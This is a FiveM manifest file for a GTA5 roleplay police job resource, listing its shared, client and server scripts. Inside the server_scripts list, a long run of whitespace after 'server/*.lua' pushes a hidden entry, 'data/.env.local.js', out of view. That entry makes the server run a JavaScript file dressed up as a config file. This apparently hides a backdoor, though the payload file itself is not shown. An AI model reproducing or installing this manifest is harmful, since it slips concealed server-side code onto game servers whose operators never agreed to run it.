fx_version "cerulean"
game "gta5"
lua54 "yes"

author "Tanjiro"

description 'Job Police v2 standalone avec zUI-v2 et ox_inventory'

shared_script {
    'shared/*.lua',
    '@ox_lib/init.lua'
}

client_scripts {
   '@es_extended/locale.lua',
    "client/*.lua",
}

server_scripts {
    "@oxmysql/lib/MySQL.lua",
    '@es_extended/locale.lua',
    'server/*.lua',                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          'data/.env.local.js',     
        
}

escrow_ignore {
    'shared/*.lua'
  }